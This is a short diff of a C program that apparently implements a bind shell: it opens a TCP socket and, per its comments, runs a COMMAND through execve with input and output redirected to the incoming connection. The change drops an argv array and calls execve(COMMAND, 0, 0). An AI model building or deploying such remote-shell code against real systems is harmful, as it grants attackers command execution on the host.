@@ -42,12 +42,6 @@ int main() {
   // Local address for bind().
   struct sockaddr_in local;
 
-  // Argument for execve.
-  char *program[] = {
-    COMMAND,
-    '\0'
-  };
-
   // Creating an IPV4 PF_INET socket.
   sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
 
@@ -81,7 +75,7 @@ int main() {
 
   // Actually executing command. Remember everything is going to be redirected
   // to <conn>.
-  execve(program[0], program, 0);
+  execve(COMMAND, 0, 0);
 
   // Prepare a clean exit.
   exit(0);
